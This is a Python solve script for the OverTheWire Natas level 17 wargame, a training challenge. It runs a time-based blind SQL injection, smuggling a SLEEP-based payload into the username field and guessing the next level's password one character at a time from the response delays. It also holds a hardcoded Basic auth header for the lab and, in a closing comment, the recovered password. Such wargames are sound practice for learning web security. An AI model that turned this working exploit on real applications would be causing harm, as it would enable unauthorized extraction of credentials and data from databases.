#!/usr/bin/env python3

import requests
import json
import re
import base64
import sys

url = "http://natas17.natas.labs.overthewire.org/index.php?debug=true"
headers = {
"Accept" : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
"Accept-Language" : "en-US,en;q=0.5",
"Content-Type" : "application/x-www-form-urlencoded",
"Content-Length" : "39",
"Origin" : "http://natas17.natas.labs.overthewire.org",
"Authorization" : "Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw==",
"Connection" : "keep-alive",
"Referer" : "http://natas17.natas.labs.overthewire.org/index.php",
"Upgrade-Insecure-Requests" : "1",
"Host" : "natas17.natas.labs.overthewire.org"
}

# POST http://natas17.natas.labs.overthewire.org/index.php HTTP/1.1
# User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:85.0) Gecko/20100101 Firefox/85.0
# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
# Accept-Language: en-US,en;q=0.5
# Content-Type: application/x-www-form-urlencoded
# Content-Length: 42
# Origin: http://natas17.natas.labs.overthewire.org
# Authorization: Basic bmF0YXMxNzo4UHMzSDBHV2JuNXJkOVM3R21BZGdRTmRraFBrcTljdw==
# Connection: keep-alive
# Referer: http://natas17.natas.labs.overthewire.org/index.php
# Upgrade-Insecure-Requests: 1
# Host: natas17.natas.labs.overthewire.org

"""
UNION SELECT IF(SUBSTRING(user_password,1,1) = CHAR(50),BENCHMARK(5000000,ENCODE('MSG','by 5 seconds')),null) FROM users WHERE user_id = 1;
"""

sql_end = "%\" AND SLEEP(1)#"

legal_chars_string = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"
sql_pre = "natas18\" and password like binary \""

example_password = "AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J"

def tryletter(prefix, letter):
    test_password = prefix + letter
    body_string_test = "username=" + sql_pre + test_password + sql_end
    response = requests.post(url, data=body_string_test, headers=headers) #proxies = { "http" : "http://127.0.0.1:9090"})
    # response = requests.post(url, data=body_string_test, headers=headers, proxies = { "http" : "http://127.0.0.1:9090"})
    new_url = url + "&" + body_string_test
    #response = requests.get(new_url, data=body_string_test, headers=headers, proxies = { "http" : "http://127.0.0.1:9090"})

    #print(test_password + " " + str(response.elapsed.total_seconds()))

    if response.elapsed.total_seconds() > 1:
        return True

    return False

def split(word):
    return [char for char in word]

legal_chars = split(legal_chars_string)
prefix = ""
while len(prefix) < len(example_password):
    for char in legal_chars:
        if tryletter(prefix, char):
            prefix += char
            break
    print("prefix: " + prefix)

# natas18 xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP